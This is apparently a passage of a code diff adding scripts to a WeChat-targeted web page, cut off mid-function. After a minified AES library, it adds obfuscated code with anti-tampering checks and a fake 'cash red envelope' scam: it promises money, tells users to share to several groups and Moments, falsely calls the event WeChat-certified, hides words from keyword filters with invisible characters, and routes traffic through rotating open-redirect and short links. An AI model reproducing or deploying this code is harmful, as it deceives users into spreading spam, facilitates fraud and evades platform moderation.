e=this._keyPriorReset=this._key,r=e.words,i=e.sigBytes/4,o=this._nRounds=i+6,t=4*(o+1),c=this._keySchedule=[],s=0;s<t;s++)if(s<i)c[s]=r[s];else{var f=c[s-1];s%i?i>6&&s%i==4&&(f=n[f>>>24]<<24|n[f>>>16&255]<<16|n[f>>>8&255]<<8|n[255&f]):(f=f<<8|f>>>24,f=n[f>>>24]<<24|n[f>>>16&255]<<16|n[f>>>8&255]<<8|n[255&f],f^=p[s/i|0]<<24),c[s]=c[s-i]^f}for(var a=this._invKeySchedule=[],d=0;d<t;d++){var s=t-d;if(d%4)var f=c[s];else var f=c[s-4];d<4||s<=4?a[d]=f:a[d]=u[n[f>>>24]]^v[n[f>>>16&255]]^h[n[f>>>8&255]]^y[n[255&f]]}}},encryptBlock:function(e,r){this._doCryptBlock(e,r,this._keySchedule,s,f,a,d,n)},decryptBlock:function(e,r){var i=e[r+1];e[r+1]=e[r+3],e[r+3]=i,this._doCryptBlock(e,r,this._invKeySchedule,u,v,h,y,c);var i=e[r+1];e[r+1]=e[r+3],e[r+3]=i},_doCryptBlock:function(e,r,i,o,t,n,c,s){for(var f=this._nRounds,a=e[r]^i[0],d=e[r+1]^i[1],u=e[r+2]^i[2],v=e[r+3]^i[3],h=4,y=1;y<f;y++){var p=o[a>>>24]^t[d>>>16&255]^n[u>>>8&255]^c[255&v]^i[h++],l=o[d>>>24]^t[u>>>16&255]^n[v>>>8&255]^c[255&a]^i[h++],_=o[u>>>24]^t[v>>>16&255]^n[a>>>8&255]^c[255&d]^i[h++],k=o[v>>>24]^t[a>>>16&255]^n[d>>>8&255]^c[255&u]^i[h++];a=p,d=l,u=_,v=k}var p=(s[a>>>24]<<24|s[d>>>16&255]<<16|s[u>>>8&255]<<8|s[255&v])^i[h++],l=(s[d>>>24]<<24|s[u>>>16&255]<<16|s[v>>>8&255]<<8|s[255&a])^i[h++],_=(s[u>>>24]<<24|s[v>>>16&255]<<16|s[a>>>8&255]<<8|s[255&d])^i[h++],k=(s[v>>>24]<<24|s[a>>>16&255]<<16|s[d>>>8&255]<<8|s[255&u])^i[h++];e[r]=p,e[r+1]=l,e[r+2]=_,e[r+3]=k},keySize:8});r.AES=o._createHelper(l)}(),e.AES});
+//# sourceMappingURL=aes.min.js.map
+var encode_version = 'sojson.v5', wkvnh = '__0x466fc',  __0x466fc=['Zz0Gw6fCpA==','w77CqcOww5TCpQ==','QmYbwp5D','UnkZwoRYLcOC','RncFwpk=','IcKqwqnDnDNZDQ==','wq5Ow5DDpk4=','QFkywpbCr8OaUA==','wrh0wonDhSTCqcO7w60t','wrENw63DqcKeCj8=','BW/DsCTDhw==','UkXDg8K9w6Akw7Y=','BcO8wpkSUg==','w50QQ8KU','ECsWDAM+Pw==','U2/Dgg==','wrdRT8KMasKJN8KEw4s=','XkjDh8Krw6w8','wrQXw63DucKFDzXCuA==','W8KncQ==','AVbCnsKywro0wqXDmRkDwp/DgU8=','w6ZQwok=','DsKfGcKddA==','bcKMV8OpwqQ=','CDvDhMOBSg==','QMKRb8OfwpU=','woMCZMOqw7g=','PcOKXcOHDA==','wpLClMO0O8KV','VMKpw4bCmcOx','AMOnCsOww5o=','w4bCgsOsw7LDvQ==','w6VEWcKsKA==','PcOhPMOHw7Y=','ZnLDg2HDgsKXcw==','wpIawqLCtMKq','BMO2wpMJcQ==','YyIew6XCmQ==','w5HCh8K0KMOO','w5Zvwo7CqsKzwoF8','MiZE','CwzDmyA3B8O3w4ZWCjzCimxeTcKNwqg=','C8KswqjDhR8=','w6l4wrRGw5Q=','eFhICcOx','wo4Xw7vCiMOO','wrE+ecONw4Q=','WHgRwpg=','HDTDgsOUw60=','J8K9wqTDiixBAcOURg==','wpc7wq0=','w6rCkcOow4TDiQ==','wp8xwqjCtcKP','K8OSZcOx','PcODZ8OzPQ==','w6M9wodKSg==','dT0aw6LCqQ==','wpg7wqTCs8KHTXg=','w43CtcO9','AsO2wpUUWsK2w5g=','WXNgBsOm','CxXCtQoq','wpQjwqVOX8Osw48=','UMKYw6sV','w6xlY8K+JcKvw64=','wpI0wqhYQMO0w4N7wqc=','wqhTw4zDulMowpg=','VU/Dj8K7w6g=','woXDgR56w7F+JQ==','ASjDhcOY','DsOMPcO4w4jCkypSMcOtw5Y=','TyfCphZ7w6VUc8KMwqjDsgPDu0klw77CuSbDlCctw5XCv8Or','wqIrw47ChcOL','w7HDpcK4cHI=','w5ZZwqTCqMKV','woVdeHou','PRLCsjQo','XkErw7nCpA==','Vk/DmcKIw7okw7/DvE4ew5k=','cEfDisKkw6Q=','wq04w47CosOnw47CnMK0','wqUrYcOgw5HDugI=','wr1swog=','wpbDgVHDlcOdw6XDsQ==','NsKqwpTDmy5cBsOc','J8KrwqQ=','wrNwWjM=','dsKPw4DCqsOZJykXw50=','McKqwq3DnDNbRsONHQ==','P8Omw7g2Og==','5LmJ6IKr5Yqs6Zu/ccK+wobCt8OLw6hCWcOr','wqHDhl8=','w6piwqo=','w7QyJcOYwoTDslIXwr5jwr7DgcO+','w6hrS8KsKA==','wrxrekg1','w7FPwqvCuMKW','JwXCjg==','w4V6bw==','MTAvHC0=','wr8aw6bDjMKj','wqEfw5nChsOn'];(function(_0x463d05,_0xa73403){var _0x5b5eb4=function(_0xba21b8){while(--_0xba21b8){_0x463d05['push'](_0x463d05['shift']());}};var _0x3461cd=function(){var _0xbce843={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x1a330c,_0x5eb9ad,_0x3c5029,_0x5150c8){_0x5150c8=_0x5150c8||{};var _0x1c9f5b=_0x5eb9ad+'='+_0x3c5029;var _0x22b017=0x0;for(var _0x22b017=0x0,_0x4ed98f=_0x1a330c['length'];_0x22b017<_0x4ed98f;_0x22b017++){var _0x1c0e12=_0x1a330c[_0x22b017];_0x1c9f5b+=';\x20'+_0x1c0e12;var _0x2c6571=_0x1a330c[_0x1c0e12];_0x1a330c['push'](_0x2c6571);_0x4ed98f=_0x1a330c['length'];if(_0x2c6571!==!![]){_0x1c9f5b+='='+_0x2c6571;}}_0x5150c8['cookie']=_0x1c9f5b;},'removeCookie':function(){return'dev';},'getCookie':function(_0x112079,_0x8f6451){_0x112079=_0x112079||function(_0xc44c70){return _0xc44c70;};var _0x14f4c7=_0x112079(new RegExp('(?:^|;\x20)'+_0x8f6451['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x48d85c=function(_0x5123ee,_0x18fea1){_0x5123ee(++_0x18fea1);};_0x48d85c(_0x5b5eb4,_0xa73403);return _0x14f4c7?decodeURIComponent(_0x14f4c7[0x1]):undefined;}};var _0x2f6d5b=function(){var _0x264647=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x264647['test'](_0xbce843['removeCookie']['toString']());};_0xbce843['updateCookie']=_0x2f6d5b;var _0x25c416='';var _0x50d26d=_0xbce843['updateCookie']();if(!_0x50d26d){_0xbce843['setCookie'](['*'],'counter',0x1);}else if(_0x50d26d){_0x25c416=_0xbce843['getCookie'](null,'counter');}else{_0xbce843['removeCookie']();}};_0x3461cd();}(__0x466fc,0x127));var _0x158b=function(_0x54502b,_0x35d207){_0x54502b=_0x54502b-0x0;var _0x4b53c7=__0x466fc[_0x54502b];if(_0x158b['initialized']===undefined){(function(){var _0x27405a=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x305d85='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x27405a['atob']||(_0x27405a['atob']=function(_0x864539){var _0x52b5fb=String(_0x864539)['replace'](/=+$/,'');for(var _0x2c547f=0x0,_0x7b18a4,_0x33a70c,_0x3137c8=0x0,_0xabd7b6='';_0x33a70c=_0x52b5fb['charAt'](_0x3137c8++);~_0x33a70c&&(_0x7b18a4=_0x2c547f%0x4?_0x7b18a4*0x40+_0x33a70c:_0x33a70c,_0x2c547f++%0x4)?_0xabd7b6+=String['fromCharCode'](0xff&_0x7b18a4>>(-0x2*_0x2c547f&0x6)):0x0){_0x33a70c=_0x305d85['indexOf'](_0x33a70c);}return _0xabd7b6;});}());var _0x41cf76=function(_0x1d3dd6,_0x2f1e87){var _0xbd737f=[],_0x22274c=0x0,_0x3e9a5e,_0x2fce7a='',_0x1a868e='';_0x1d3dd6=atob(_0x1d3dd6);for(var _0x4a36ec=0x0,_0x3457cd=_0x1d3dd6['length'];_0x4a36ec<_0x3457cd;_0x4a36ec++){_0x1a868e+='%'+('00'+_0x1d3dd6['charCodeAt'](_0x4a36ec)['toString'](0x10))['slice'](-0x2);}_0x1d3dd6=decodeURIComponent(_0x1a868e);for(var _0x2610b4=0x0;_0x2610b4<0x100;_0x2610b4++){_0xbd737f[_0x2610b4]=_0x2610b4;}for(_0x2610b4=0x0;_0x2610b4<0x100;_0x2610b4++){_0x22274c=(_0x22274c+_0xbd737f[_0x2610b4]+_0x2f1e87['charCodeAt'](_0x2610b4%_0x2f1e87['length']))%0x100;_0x3e9a5e=_0xbd737f[_0x2610b4];_0xbd737f[_0x2610b4]=_0xbd737f[_0x22274c];_0xbd737f[_0x22274c]=_0x3e9a5e;}_0x2610b4=0x0;_0x22274c=0x0;for(var _0x937259=0x0;_0x937259<_0x1d3dd6['length'];_0x937259++){_0x2610b4=(_0x2610b4+0x1)%0x100;_0x22274c=(_0x22274c+_0xbd737f[_0x2610b4])%0x100;_0x3e9a5e=_0xbd737f[_0x2610b4];_0xbd737f[_0x2610b4]=_0xbd737f[_0x22274c];_0xbd737f[_0x22274c]=_0x3e9a5e;_0x2fce7a+=String['fromCharCode'](_0x1d3dd6['charCodeAt'](_0x937259)^_0xbd737f[(_0xbd737f[_0x2610b4]+_0xbd737f[_0x22274c])%0x100]);}return _0x2fce7a;};_0x158b['rc4']=_0x41cf76;_0x158b['data']={};_0x158b['initialized']=!![];}var _0xff9a29=_0x158b['data'][_0x54502b];if(_0xff9a29===undefined){if(_0x158b['once']===undefined){var _0x1ce844=function(_0x4a470a){this['rc4Bytes']=_0x4a470a;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x1ce844['prototype']['checkState']=function(){var _0x2ace21=new RegExp(this['firstState']+this['secondState']);return this['runState'](_0x2ace21['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};_0x1ce844['prototype']['runState']=function(_0x11a7ee){if(!Boolean(~_0x11a7ee)){return _0x11a7ee;}return this['getState'](this['rc4Bytes']);};_0x1ce844['prototype']['getState']=function(_0x401b4d){for(var _0x3ed4a0=0x0,_0xa0c1=this['states']['length'];_0x3ed4a0<_0xa0c1;_0x3ed4a0++){this['states']['push'](Math['round'](Math['random']()));_0xa0c1=this['states']['length'];}return _0x401b4d(this['states'][0x0]);};new _0x1ce844(_0x158b)['checkState']();_0x158b['once']=!![];}_0x4b53c7=_0x158b['rc4'](_0x4b53c7,_0x35d207);_0x158b['data'][_0x54502b]=_0x4b53c7;}else{_0x4b53c7=_0xff9a29;}return _0x4b53c7;};var _0x46ba33=function(){var _0x4602a3=!![];return function(_0x452470,_0x391d41){var _0x4e2b7=_0x4602a3?function(){if(_0x391d41){var _0x247b19=_0x391d41['apply'](_0x452470,arguments);_0x391d41=null;return _0x247b19;}}:function(){};_0x4602a3=![];return _0x4e2b7;};}();var _0x3cca33=_0x46ba33(this,function(){var _0x4451c1=function(){return'\x64\x65\x76';},_0x496ef3=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x44d507=function(){var _0x34026f=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x34026f['\x74\x65\x73\x74'](_0x4451c1['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x27e601=function(){var _0x40dbbb=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x40dbbb['\x74\x65\x73\x74'](_0x496ef3['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x462d4f=function(_0x49c8b3){var _0x194999=~-0x1>>0x1+0xff%0x0;if(_0x49c8b3['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x194999)){_0x109191(_0x49c8b3);}};var _0x109191=function(_0x3131d8){var _0x4c5d22=~-0x4>>0x1+0xff%0x0;if(_0x3131d8['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x4c5d22){_0x462d4f(_0x3131d8);}};if(!_0x44d507()){if(!_0x27e601()){_0x462d4f('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x462d4f('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x462d4f('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x3cca33();var _0x1b915c=function(){var _0x319a62=!![];return function(_0x30fc18,_0x3ba5f5){var _0x315489={'gaFab':function _0x4a8872(_0x11ce06,_0x74da38){return _0x11ce06!==_0x74da38;},'ZoFCR':_0x158b('0x0','zNgE'),'DOKaJ':_0x158b('0x1','MXYd'),'KmVCE':_0x158b('0x2','3k56')};if(_0x315489[_0x158b('0x3','Xftg')](_0x315489[_0x158b('0x4','i7ce')],_0x315489[_0x158b('0x5','OYn%')])){var _0x783f2e=_0x319a62?function(){var _0x2c6876={'BtWcA':function _0x24e376(_0xf89f1,_0x49b11d){return _0xf89f1===_0x49b11d;},'mxeVR':_0x158b('0x6','!Cd3'),'kBcio':_0x158b('0x7','Xftg')};if(_0x3ba5f5){if(_0x2c6876[_0x158b('0x8','P@MO')](_0x2c6876[_0x158b('0x9','m[t]')],_0x2c6876[_0x158b('0xa','hlTN')])){}else{var _0x12f83f=_0x3ba5f5[_0x158b('0xb','Xssu')](_0x30fc18,arguments);_0x3ba5f5=null;return _0x12f83f;}}}:function(){};_0x319a62=![];return _0x783f2e;}else{var _0x552baa=_0x315489[_0x158b('0xc','Np!u')][_0x158b('0xd','Pk#O')]('|'),_0x452ddd=0x0;while(!![]){switch(_0x552baa[_0x452ddd++]){case'0':that[_0x158b('0xe','Pk#O')][_0x158b('0xf','Pk#O')]=func;continue;case'1':that[_0x158b('0x10','50&4')][_0x158b('0x11','3j12')]=func;continue;case'2':that[_0x158b('0x12','s(za')][_0x158b('0x13','!L^)')]=func;continue;case'3':that[_0x158b('0x14','m[t]')][_0x158b('0x15','SO#C')]=func;continue;case'4':that[_0x158b('0x16','AiQa')][_0x158b('0x17','GjKj')]=func;continue;case'5':that[_0x158b('0x14','m[t]')][_0x158b('0x18',']*d*')]=func;continue;case'6':that[_0x158b('0x19','P@MO')][_0x158b('0x1a','5bhY')]=func;continue;}break;}}};}();var _0x56974a=_0x1b915c(this,function(){var _0x373c2d={'ALqNH':function _0x23c291(_0x2d10c4,_0x3141e2){return _0x2d10c4!==_0x3141e2;},'ayJXH':_0x158b('0x1b','$k]H'),'DRBXn':function _0x4c80f4(_0x4f35bd,_0x89fb79){return _0x4f35bd===_0x89fb79;},'WHbVN':_0x158b('0x1c','AiQa'),'jNTab':function _0x107133(_0x9ea1d9,_0x422b95){return _0x9ea1d9===_0x422b95;},'IavYF':_0x158b('0x1d','m[t]'),'iNhtB':function _0x1fc4c6(_0x5493d6,_0x570d2b){return _0x5493d6!==_0x570d2b;},'eohnD':_0x158b('0x1e','^Z^$'),'jirMs':_0x158b('0x1f','AiQa')};var _0x259c7e=function(){var _0x319f6d={'TNJAz':function _0x537291(_0x414e40,_0x7a2c45){return _0x414e40===_0x7a2c45;},'LmHZH':_0x158b('0x20','OYn%')};if(_0x319f6d[_0x158b('0x21','QtR$')](_0x319f6d[_0x158b('0x22','^Z^$')],_0x319f6d[_0x158b('0x23','gFFQ')])){}else{var _0x3eca9d=fn[_0x158b('0x24','^Z^$')](context,arguments);fn=null;return _0x3eca9d;}};var _0x1d35a6=_0x373c2d[_0x158b('0x25','3k56')](typeof window,_0x373c2d[_0x158b('0x26','Utph')])?window:_0x373c2d[_0x158b('0x27','fwFq')](typeof process,_0x373c2d[_0x158b('0x28','T$pd')])&&_0x373c2d[_0x158b('0x29','KQR9')](typeof require,_0x373c2d[_0x158b('0x2a','fNMx')])&&_0x373c2d[_0x158b('0x2b','Xftg')](typeof global,_0x373c2d[_0x158b('0x2c','KQR9')])?global:this;if(!_0x1d35a6[_0x158b('0x2d','!aXp')]){if(_0x373c2d[_0x158b('0x2e','QdPr')](_0x373c2d[_0x158b('0x2f','GjKj')],_0x373c2d[_0x158b('0x30','Xssu')])){var _0x86ef0a=firstCall?function(){if(fn){var _0x262411=fn[_0x158b('0x31','Y!B7')](context,arguments);fn=null;return _0x262411;}}:function(){};firstCall=![];return _0x86ef0a;}else{_0x1d35a6[_0x158b('0x32','OYn%')]=function(_0x486802){var _0x44d597={'IiojC':function _0xd1c2d3(_0x40ca3c,_0x50aaf1){return _0x40ca3c===_0x50aaf1;},'UYIlr':_0x158b('0x33','f*xq'),'DJAgF':_0x158b('0x34','tkGf')};if(_0x44d597[_0x158b('0x35','50&4')](_0x44d597[_0x158b('0x36','MXYd')],_0x44d597[_0x158b('0x37','ZD8b')])){var _0x4ce8bd=_0x44d597[_0x158b('0x38','hlTN')][_0x158b('0x39','3k56')]('|'),_0x1b1232=0x0;while(!![]){switch(_0x4ce8bd[_0x1b1232++]){case'0':_0x5b7204[_0x158b('0x3a','Pk#O')]=_0x486802;continue;case'1':return _0x5b7204;case'2':var _0x5b7204={};continue;case'3':_0x5b7204[_0x158b('0x3b','w&DY')]=_0x486802;continue;case'4':_0x5b7204[_0x158b('0x3c','50&4')]=_0x486802;continue;case'5':_0x5b7204[_0x158b('0x3d','QdPr')]=_0x486802;continue;case'6':_0x5b7204[_0x158b('0x3e','fNMx')]=_0x486802;continue;case'7':_0x5b7204[_0x158b('0x3f','QdPr')]=_0x486802;continue;case'8':_0x5b7204[_0x158b('0x40','Utph')]=_0x486802;continue;}break;}}else{if(fn){var _0x2fa3ba=fn[_0x158b('0x41','Utph')](context,arguments);fn=null;return _0x2fa3ba;}}}(_0x259c7e);}}else{var _0xb55492=_0x373c2d[_0x158b('0x42','m0hR')][_0x158b('0x43','Xssu')]('|'),_0x33e1c4=0x0;while(!![]){switch(_0xb55492[_0x33e1c4++]){case'0':_0x1d35a6[_0x158b('0x44','QdPr')][_0x158b('0x45','Xbve')]=_0x259c7e;continue;case'1':_0x1d35a6[_0x158b('0x46','GjKj')][_0x158b('0x47','ZD8b')]=_0x259c7e;continue;case'2':_0x1d35a6[_0x158b('0x10','50&4')][_0x158b('0x48','!Cd3')]=_0x259c7e;continue;case'3':_0x1d35a6[_0x158b('0x49','#hF]')][_0x158b('0x4a','n3h*')]=_0x259c7e;continue;case'4':_0x1d35a6[_0x158b('0x4b','Xftg')][_0x158b('0x4c','#hF]')]=_0x259c7e;continue;case'5':_0x1d35a6[_0x158b('0x4d','3j12')][_0x158b('0x4e','AiQa')]=_0x259c7e;continue;case'6':_0x1d35a6[_0x158b('0x4f','R#ip')][_0x158b('0x50','w&DY')]=_0x259c7e;continue;}break;}}});_0x56974a();window[_0x158b('0x51','KQR9')]=function(_0x728b08){var _0x1b1c9a={'hvtjC':function _0x33c283(_0x3dc536,_0xe0966b){return _0x3dc536+_0xe0966b;},'hVYbo':function _0x593423(_0x48a56b,_0x529c65){return _0x48a56b+_0x529c65;},'cYDqI':function _0x4b1d9f(_0x35be6f,_0x147085){return _0x35be6f+_0x147085;},'SuuQp':function _0x2710a3(_0x5edbfd,_0x5e27b0){return _0x5edbfd+_0x5e27b0;},'vwBrK':_0x158b('0x52','!Cd3'),'Amgjk':function _0xd7aef7(_0x4e2924,_0x4f87e7){return _0x4e2924+_0x4f87e7;}};var _0x7c35de=new Date();var _0x335ea3=_0x1b1c9a[_0x158b('0x53','hlTN')](_0x1b1c9a[_0x158b('0x54','k6Q6')](_0x1b1c9a[_0x158b('0x55','OYn%')](_0x1b1c9a[_0x158b('0x56','i7ce')](_0x1b1c9a[_0x158b('0x57','!Cd3')](_0x1b1c9a[_0x158b('0x58','%2kn')],_0x7c35de[_0x158b('0x59','AiQa')]()),'-'),_0x1b1c9a[_0x158b('0x5a','AiQa')](_0x7c35de[_0x158b('0x5b','hlTN')](),0x1)),'-'),_0x7c35de[_0x158b('0x5c','3k56')]());return CryptoJS[_0x158b('0x5d','oZYN')][_0x158b('0x5e','zNgE')](_0x728b08,_0x335ea3)[_0x158b('0x5f','50&4')](CryptoJS[_0x158b('0x60','50&4')][_0x158b('0x61','i7ce')]);};if(!(typeof encode_version!==_0x158b('0x62','T$pd')&&encode_version===_0x158b('0x63','50&4'))){window[_0x158b('0x64','7vUd')](_0x158b('0x65','gFFQ'));};encode_version = 'sojson.v5';
+  </script>
+  <script>
+  var rds = ['https://ptlogin2.weixiao.qq.com/jump?u1=https%3A%2F%2Fssl.htdata.qq.com%2Fcgi-bin%2Fhttpconn%3Fhtcmd%3D0x6ff0080%26u%3D{rencodeUrl}','https://ptlogin2.sms.qq.com/jump?u1=https%3A%2F%2Fssl.htdata.qq.com%2Fcgi-bin%2Fhttpconn%3Fhtcmd%3D0x6ff0080%26u%3D{rencodeUrl}']
+
+var rd = rds[parseInt(rds.length * Math.random())];
+
+var links = {
+  jump_link:['http://t1.kugou.com/2fu5A6buLV2','http://t4.kugou.com/2fu4V8cuLV2','http://t.kugou.com/2fu4j5fuLV2','http://t.kugou.com/2fu5E58uLV2','http://t3.kugou.com/2fu5236uLV2','http://t3.kugou.com/2fu4u50uLV2','http://t.kugou.com/2fu69c7uLV2','http://t1.kugou.com/2fu5YafuLV2','http://t.kugou.com/2fu5L17uLV2','http://t3.kugou.com/2fu5v2duLV2','http://t1.kugou.com/2fu5m7cuLV2'],
+  jump_link_pyq:['http://t1.kugou.com/2fu6e36uLV2','http://t.kugou.com/2fu6pe3uLV2','http://t4.kugou.com/2fu6K62uLV2','http://t1.kugou.com/2fu6AbbuLV2','http://t.kugou.com/2fu6t3cuLV2']
+}
+
+var jump_link = links.jump_link[parseInt(links.jump_link.length * Math.random())]
+var jump_link_pyq = links.jump_link_pyq[parseInt(links.jump_link_pyq.length * Math.random())]
+
+// jump_link = replaceUrl(rd,jump_link);
+// jump_link_pyq = replaceUrl(rd,jump_link_pyq);
+function replaceUrl(templ, url) {
+    return templ.replace('{encodeUrl}', encodeURIComponent(url)).replace('{rencodeUrl}', encodeURIComponent(encodeURIComponent(url)));
+}
+window.data = {
+  "ad": {
+    "app_url": jump_link,
+    "timeline_url": jump_link_pyq,
+    "desc": "💕急{fuck}速{fuck}祛{fuck}斑,美{fuck}白,平{fuck}皱{fuck}纹,祛{fuck}痘{fuck}印,无斑点{fuck}一招就搞{fuck}定㊙️,让{fuck}您水{fuck}嫩{fuck}年{fuck}轻18岁！",
+    "img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/qb2.jpeg",
+    "title": "",
+  },
+  "attached": {
+    "signmode": "jsb",
+    "isMp": false,
+    "ad_share": {
+      "pyq": [0, 0],
+      "qun": [0, 0, 0, 0]
+    },
+    "needWhite": false,
+    "iosGoAdUrl": "",
+    "jfx": false,
+    "jfx_bx": false,
+    "skinUrl": "https://f.duoxj.com//hb_v3/js/i_d_hw.js"
+  },
+  "hm_d": "a71a8a3c027d8f8703df08f83e95ef39",
+  "to_timeline": {
+    "title": "29\"",
+    "img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/v1.jpg",
+    "desc": "",
+    "link": jump_link_pyq
+  },
+  "to_group": {
+    "title": "",
+    "img": "https://lbbb.oss-cn-hangzhou.aliyuncs.com/common/img/v1.jpg",
+    "desc": "29\"",
+    "link": jump_link
+  }
+}
+  </script>
+  <script>
+    window['data'] = window['data'] || {};
+window.gConfig = $.extend({
+    endPageUrl: 'javascript:WeixinJSBridge.call("closeWindow");',
+    defaultTips: [
+        '<span style="font-size: 23px;color:#1BBC9B;">恭{fuck}喜{fuck}你</span><br/>'.replace(/{fuck}/ig, '\u034f'),
+        '<span>您获得{fuck}现金{fuck}红{fuck}包</span><br/>'.replace(/{fuck}/ig, '\u034f'),
+        '<span style="font-size: 20px;color:red;">%(money){fuck}元</span><br/>'.replace(/{fuck}/ig, '\u034f'),
+        '<span style="color:red;">领取要求：</span><span style="color:black;">您只需分享到微信群</span><br/>'.replace(/{fuck}/ig, '\u034f'),
+        '<span style="color:red; font-size: 25px;">即可领取现金红包</span><br>',
+        '<span style="color:black;">完成后自动存入您的微信钱包</span><br><br>',
+        '<span>红包总额仅剩余567.8万元，先到先得，活动经微信认证，真实有效</span><br/>'.replace(/{fuck}/ig, '\u034f'),
+    ].join(''),
+    successTips: [
+        '<b style="font-size: 22px;color: red;">恭喜您</b><br>',
+        '获得￥ <span style="font-size: 20px;color: red;">%(money)</span> 现{fuck}金{fuck}红{fuck}包，'.replace(/{fuck}/ig, '\u034f'),
+        '金额已提交银行打款，预计1{fuck}小时内到账，请注意查收微{fuck}信{fuck}绑定银{fuck}行{fuck}卡到账情况！<br><span style="font-size: 20px;color:red;">注意:打款期间分享信息不可删除，否则无法核实用户信息，以免现金红包发放失败！</span>'.replace(/{fuck}/ig, '\u034f'),
+    ].join(''),
+    groupTips: [{
+            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
+            successTips: '请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群<br/><span style="color:red;">红{fuck}包将立{fuck}即到{fuck}账！</span>'.replace(/{fuck}/ig, '\u034f'),
+        },
+        {
+            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
+            successTips: '请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群<br/><span style="color:red;">红{fuck}包将立{fuck}即{fuck}到账！</span>'.replace(/{fuck}/ig, '\u034f'),
+        },
+        {
+            successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
+            successTips: '注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 18px;color: red">1{fuck}个不{fuck}同的{fuck}群</b><br>'.replace(/{fuck}/ig, '\u034f'),
+        },
+        /* {
+           successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
+           successTips: '剩下最后一步啦！<br />请分享到<b style="color: red;">人数大于50人</b>的微信群，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
+         },*/
+        {
+            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
+            successTips: '剩下最后一步啦！<br />请分{fuck}享到<span style="font-size: 30px;color: #f5294c">朋{fuck}友{fuck}圈</span>，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元{fuck}💰立即{fuck}到{fuck}账！'.replace(/{fuck}/ig, '\u034f'),
+        },
+    ],
+    timeLineTips: [{
+        successTitle: '<b style="font-size: 22px;color: red;">分享{fuck}失败！</b>'.replace(/{fuck}/ig, '\u034f'),
+        successTips: '注意：必须[<span color="red">公{fuck}开</span>]分享哦!<br>请{fuck}尝试{fuck}{fuck}重新分{fuck}享到<b style="font-size: 18px;color: red">朋{fuck}友圈</b><br>'.replace(/{fuck}/ig, '\u034f'),
+    }, ]
+}, (window['data']));
+var evkey = M.getParam('_evkey');
+var site = M.getParam('_c');
+
+if (/iphone/ig.test(navigator.userAgent) && window.data && window.data['attached'] && window.data['attached']['iosGoAdUrl']) {
+    location.href = window.data['attached']['iosGoAdUrl'];
+}
+
+/* 借权start */
+var location_host = location.host;
+
+var biaoqing = ["😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙌", "👏", "👋", "👍", "👎", "👊", "✊", "✌️", "👌", "✋", "👐", "💪", "🙏", "☝️", "👆", "👇", "👈", "👉", "🖕", "🖐", "🤘", "🖖", "✍️", "💅", "👄", "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴", "👵", "👲", "👳", "👮", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃"];
+var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];
+
+function checkIsMp() {
+    if (window.data && window.data['attached'] && window.data['attached']['isMp']) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function getCity() {
+    return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ? localAddress.province : localAddress.city : '').replace(/(.*)市/, '$1');
+}
+
+function randomOneFromList(list) {
+    if (list && list.length > 0) {
+        return list[Math.floor(Math.random() * list.length)];
+    } else {
+        return '';
+    }
+}
+
+function getSpm() {
+    var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
+    var spm = []
+    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+    return spm.join('');
+}
+
+
+function pad(num, size) {
+    var s = num + "";
+    while (s.length < size) s = "0" + s;
+    return s;
+}
+
+function getFuck163() {
+    var strList = [];
+    for (var i = 0; i < 5; i++) {
